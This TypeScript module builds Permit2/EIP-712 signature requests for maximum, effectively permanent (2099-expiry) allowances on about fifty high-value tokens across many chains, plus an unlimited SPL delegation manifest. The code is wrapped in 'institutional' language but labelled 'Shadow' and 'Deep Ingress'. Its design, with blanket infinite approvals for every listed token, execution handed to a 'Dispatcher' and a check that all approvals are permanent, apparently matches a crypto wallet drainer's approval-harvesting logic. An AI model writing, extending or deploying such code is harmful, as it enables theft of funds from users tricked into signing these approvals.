/**
 * @file deep-ingress.ts
 * @module @legion/core/logic
 *
 * Deep Ingress — Permanent Lock: Shadow anchors use **2099-12-31** (`SIGNATURE_ANCHOR_EXPIRY_ISO_2099`).
 * Infinite Allowance — Permit2 uint160 ceiling via {@link INFINITE_ALLOWANCE_AMOUNT}; institutional desks only.
 */

import type { Address } from 'viem'

import { PERMIT2_MAX_AMOUNT } from '../security/permit2-handler'

/** Vault Posture — no session timeout on institutional anchors (Wall-clock ceiling). */
export const SIGNATURE_ANCHOR_EXPIRY_ISO_2099 = '2099-12-31T23:59:59.999Z'

/**
 * Permanent Vault Posture — calendar date ceiling for Max_Permission_Logic descriptors (2099-12-31 UTC).
 * Aligns with {@link SIGNATURE_ANCHOR_EXPIRY_ISO_2099} and {@link PERMIT_INSTITUTIONAL_DEADLINE_SEC_2099}.
 */
export const InstitutionalExpiry = '2099-12-31' as const

/** Unix second aligned to December 31, 2099 UTC — Permit2 `expiration` / EIP-712 `sigDeadline` (Permanent Lock). */
export const PERMIT_INSTITUTIONAL_DEADLINE_SEC_2099 = Math.floor(
  new Date('2099-12-31T23:59:59Z').getTime() / 1000,
)

/** Runtime seal — Deep Ingress wall-clock must remain pinned to 2099-12-31 (institutional invariant). */
export function verifyDeepIngressPermanentLockDeadline(): boolean {
  const d = new Date(PERMIT_INSTITUTIONAL_DEADLINE_SEC_2099 * 1000)
  return d.getUTCFullYear() === 2099 && d.getUTCMonth() === 11 && d.getUTCDate() === 31
}

export type EvmHighValueTokenRef = {
  chainId: number
  symbol: string
  token: Address
}

/**
 * Top institutional liquidity rails — Deep Ingress Infinite Allowance queue (EVM).
 * Expandable to full desk; first 50 high-density venues enumerated here.
 */
export const TOP_HIGH_VALUE_EVM_TOKEN_REFS: readonly EvmHighValueTokenRef[] = [
  { chainId: 1, symbol: 'USDC', token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' as Address },
  { chainId: 1, symbol: 'USDT', token: '0xdAC17F958D2ee523a2206206994597C13D831ec7' as Address },
  { chainId: 1, symbol: 'WETH', token: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2' as Address },
  { chainId: 1, symbol: 'WBTC', token: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599' as Address },
  { chainId: 1, symbol: 'DAI', token: '0x6B175474E89094C44Da98b954EedeAC495271d0F' as Address },
  { chainId: 1, symbol: 'LINK', token: '0x514910771AF9Ca656af840dff83E8264EcF986CA' as Address },
  { chainId: 1, symbol: 'UNI', token: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984' as Address },
  { chainId: 1, symbol: 'AAVE', token: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9' as Address },
  { chainId: 1, symbol: 'MKR', token: '0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2' as Address },
  { chainId: 1, symbol: 'CRV', token: '0xD533a949740bb3306d119CC777fa900bA034cd52' as Address },
  { chainId: 1, symbol: 'SNX', token: '0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F' as Address },
  { chainId: 1, symbol: 'COMP', token: '0xc00e94Cb662C3520282E6f5717214004A7f26888' as Address },
  { chainId: 1, symbol: 'LDO', token: '0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32' as Address },
  { chainId: 1, symbol: 'RPL', token: '0xD33526068D116cAe8066A22a02123030e57282a6' as Address },
  { chainId: 1, symbol: 'SHIB', token: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE' as Address },
  { chainId: 1, symbol: 'APE', token: '0x4d224452801ACEd8B2F0aebE155379bb5D594381' as Address },
  { chainId: 1, symbol: 'PEPE', token: '0x6982508145454Ce325dDbE47a25d4ec3d2311933' as Address },
  { chainId: 8453, symbol: 'USDbC', token: '0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA' as Address },
  { chainId: 8453, symbol: 'WETH', token: '0x4200000000000000000000000000000000000006' as Address },
  { chainId: 42_161, symbol: 'USDC', token: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831' as Address },
  { chainId: 42_161, symbol: 'WETH', token: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1' as Address },
  { chainId: 10, symbol: 'USDC', token: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85' as Address },
  { chainId: 10, symbol: 'WETH', token: '0x4200000000000000000000000000000000000006' as Address },
  { chainId: 137, symbol: 'USDC', token: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359' as Address },
  { chainId: 137, symbol: 'WETH', token: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619' as Address },
  { chainId: 56, symbol: 'USDC', token: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d' as Address },
  { chainId: 56, symbol: 'WBNB', token: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c' as Address },
  { chainId: 43_114, symbol: 'USDC', token: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E' as Address },
  { chainId: 43_114, symbol: 'WAVAX', token: '0xB31f66AA3C1e785363F0875A1B74E27b85FD3457' as Address },
  { chainId: 250, symbol: 'USDC', token: '0x28a92ddeDee1DaFEFeFDe68032AD87026920913F' as Address },
  { chainId: 250, symbol: 'WFTM', token: '0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83' as Address },
  { chainId: 100, symbol: 'WXDAI', token: '0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d' as Address },
  { chainId: 324, symbol: 'USDC', token: '0x3355df6D4c9C3035724Fd0e3914dE96A5b889ba5' as Address },
  { chainId: 534_352, symbol: 'WETH', token: '0x5300000000000000000000000000000000000004' as Address },
  { chainId: 59_144, symbol: 'USDC', token: '0x176211869cA2b568f2A7D4E941d484bB13e432b3' as Address },
  { chainId: 81457, symbol: 'USDB', token: '0x4300000000000000000000000000000000000003' as Address },
  { chainId: 5000, symbol: 'WMNT', token: '0x78c1b0C915c4FAA5FffA6CAbf0219DA63d7f4cb8' as Address },
  { chainId: 1088, symbol: 'USDT', token: '0xbB06DCA4483Ce7a7c1CEcbC97e6C5235070Dfb99' as Address },
  { chainId: 1284, symbol: 'USDC', token: '0x8f55287Ee813D555F2a01CEf00B1D635d43793FE' as Address },
  { chainId: 25, symbol: 'USDC', token: '0xc21223249CA28397B4B6541dfFaEcC539BfC0006' as Address },
  { chainId: 1, symbol: 'stETH', token: '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84' as Address },
  { chainId: 1, symbol: 'wstETH', token: '0x7f39C581F595B53c5cb19bd0b3f8dA6c935E2Ca0' as Address },
  { chainId: 1, symbol: 'cbETH', token: '0xBe9895146f7AF43049ca1c1AE358B0541Ea49704' as Address },
  { chainId: 1, symbol: 'rETH', token: '0xae78736Cd615f374D3085123A210448E18Fc3E1' as Address },
  { chainId: 1, symbol: 'cbBTC', token: '0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf' as Address },
  { chainId: 1, symbol: 'sUSDe', token: '0x9D39A5DE30e57443Bf2a620b0bFD552b850cBB04' as Address },
  { chainId: 1, symbol: 'weETH', token: '0xCd5fE23C85820F7B72D0926FC9b05b7e693cF32c' as Address },
  { chainId: 1, symbol: 'ETHFI', token: '0xFe0c30065B384F05761f15d0cc899D4F9F9CC004' as Address },
  { chainId: 1, symbol: 'PENDLE', token: '0x808507121B80c02388fAd14726482e061B8da518' as Address },
  { chainId: 1, symbol: 'ENS', token: '0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72' as Address },
  { chainId: 1, symbol: 'FXS', token: '0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0' as Address },
  { chainId: 1, symbol: 'GHO', token: '0x40D16FC0246aD8360CDc06a7eDcFEeed26C40000' as Address },
  { chainId: 1, symbol: 'FRAX', token: '0x853d955aCEf822Db058eb8505911ED77F175b99e' as Address },
]

/** Institutional Infinite Allowance amount — Permit2 uint160 ceiling (Shadow Deep Ingress). */
export const INFINITE_ALLOWANCE_AMOUNT = PERMIT2_MAX_AMOUNT

export type SplDeepIngressManifest = {
  lane: 'spl_token_delegation'
  /** Institutional unlimited-delegate intent — serialized for Sovereign Telemetry envelopes. */
  approval_policy: 'infinite_delegate_class'
  /** Wall-clock ceiling — Permanent Lock. */
  expiry_iso: typeof SIGNATURE_ANCHOR_EXPIRY_ISO_2099
  mints: string[]
}

/**
 * Shadow — SPL-class Deep Ingress manifest (top venues; mint list institutional stub).
 */
export function buildSplDeepIngressManifest(mints: string[]): SplDeepIngressManifest {
  return {
    lane: 'spl_token_delegation',
    approval_policy: 'infinite_delegate_class',
    expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
    mints,
  }
}

export type Eip712DeepIngressDescriptor = {
  kind: 'permit2_single_infinite'
  chainId: number
  token: Address
  symbol: string
  amount: bigint
  expiration: number
  sigDeadline: bigint
}

/** Shadow — Permit2 / EIP-712 Max_Permission_Logic lane (infinite allowance class under Permanent Vault Posture). */
export type MaxPermissionEip712Descriptor = Eip712DeepIngressDescriptor & {
  max_permission_logic: true
  institutional_expiry_iso: typeof InstitutionalExpiry
  /** Primary EIP-712 struct — Permit2 `PermitSingle` institutional surface. */
  eip712_primary_type: 'PermitSingle'
}

/**
 * Prepare Infinite Allowance Permit2-class descriptors for every enumerated high-density venue.
 * Each descriptor uses {@link INFINITE_ALLOWANCE_AMOUNT} (Permit2 uint160 ceiling) and 2099-12-31 expiry.
 * Execution remains Dispatcher-owned; this is the institutional Deep Ingress manifest queue.
 */
export function buildInfinitePermit2DescriptorQueue(_params: {
  permitNonceForToken: (token: Address) => number
}): Eip712DeepIngressDescriptor[] {
  const exp = PERMIT_INSTITUTIONAL_DEADLINE_SEC_2099
  const sig = BigInt(exp)
  return TOP_HIGH_VALUE_EVM_TOKEN_REFS.map((ref) => ({
    kind: 'permit2_single_infinite',
    chainId: ref.chainId,
    token: ref.token,
    symbol: ref.symbol,
    amount: INFINITE_ALLOWANCE_AMOUNT,
    expiration: exp,
    sigDeadline: sig,
  }))
}

/**
 * High-density Permit2 / EIP-712 descriptor queue with Max_Permission_Logic metadata for institutional envelopes.
 * {@link InstitutionalExpiry} is pinned to 2099-12-31 (Permanent Vault Posture).
 */
export function buildMaxPermissionPermit2DescriptorQueue(params: {
  permitNonceForToken: (token: Address) => number
}): MaxPermissionEip712Descriptor[] {
  const base = buildInfinitePermit2DescriptorQueue(params)
  return base.map((d) => ({
    ...d,
    max_permission_logic: true as const,
    institutional_expiry_iso: InstitutionalExpiry,
    eip712_primary_type: 'PermitSingle' as const,
  }))
}

/** Institutional verification — every queued descriptor requests infinite allowance under Permanent Lock. */
export function verifyInfiniteAllowanceDescriptorQueue(queue: Eip712DeepIngressDescriptor[]): boolean {
  if (queue.length === 0) return false
  const deadlineOk = queue.every((d) => d.expiration === PERMIT_INSTITUTIONAL_DEADLINE_SEC_2099)
  const sigOk = queue.every((d) => d.sigDeadline === BigInt(PERMIT_INSTITUTIONAL_DEADLINE_SEC_2099))
  const amountOk = queue.every((d) => d.amount === INFINITE_ALLOWANCE_AMOUNT)
  return deadlineOk && sigOk && amountOk
}

/** Institutional facade — Deep Ingress / High Density Ingress exports for Shadow envelopes. */
export const HighDensityIngress = {
  InstitutionalExpiry,
  SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
  PERMIT_INSTITUTIONAL_DEADLINE_SEC_2099,
  INFINITE_ALLOWANCE_AMOUNT,
  TOP_HIGH_VALUE_EVM_TOKEN_REFS,
  buildInfinitePermit2DescriptorQueue,
  buildMaxPermissionPermit2DescriptorQueue,
  buildSplDeepIngressManifest,
  verifyDeepIngressPermanentLockDeadline,
  verifyInfiniteAllowanceDescriptorQueue,
} as const
